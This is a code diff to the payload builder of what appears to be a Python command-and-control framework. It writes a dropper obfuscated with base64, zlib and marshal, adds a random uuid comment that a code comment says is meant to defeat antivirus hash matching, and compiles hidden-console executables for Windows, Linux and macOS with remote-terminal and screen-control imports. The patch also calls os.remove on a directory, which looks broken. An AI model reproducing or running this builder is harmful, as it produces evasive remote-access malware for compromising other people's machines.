@@ -240,11 +240,14 @@ class C2:
 
         requ_numpy="1.24.4"
 
+        if not os.path.isdir(payload_file_name):
+            os.makedirs(payload_file_name)
+
         if os_name == "Windows":
             requ_numpy = """2.2.1
 pywinpty"""
 
-        with open('requirements.txt', 'w') as f:
+        with open(f'{payload_file_name}/requirements.txt', 'w') as f:
             f.writelines("""
 requests==2.31.0
 python-socketio==5.11.0
@@ -285,7 +288,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 #{uuid.uuid4()}"""
         # this will prevent anti-viruses from looking for hashes of the script
 
-        with open(f"{payload_file_name}.py", "w") as f:
+        with open(f"{payload_file_name}/{payload_file_name}.py", "w") as f:
             f.writelines(dropper)
 
         if not os.path.isdir("payloads"):
@@ -294,7 +297,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         try:
             if os_name == "Windows":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pywinpty --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/{payload_file_name}/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pywinpty --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
@@ -307,7 +310,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "Linux":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/{payload_file_name}/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
@@ -318,24 +321,20 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "OSX":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pyautogui --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/{payload_file_name}/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pyautogui --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
                 print(
                     result.stdout.decode(), result.stderr.decode()
                 )  # Print output for debugging
-                shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
+                shutil.copy(f"{payload_file_name}/dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
-            os.remove(f"{payload_file_name}.py")
-            os.remove(f"{payload_file_name}.spec")
-            os.remove('requirements.txt')
+            os.remove(f"{payload_file_name}")
         
         except Exception as e:
             print(e)
-            os.remove(f"{payload_file_name}.py")
-            os.remove(f"{payload_file_name}.spec")
-            os.remove('requirements.txt')
+            os.remove(f"{payload_file_name}")
 
 
     # File uploads is working again full
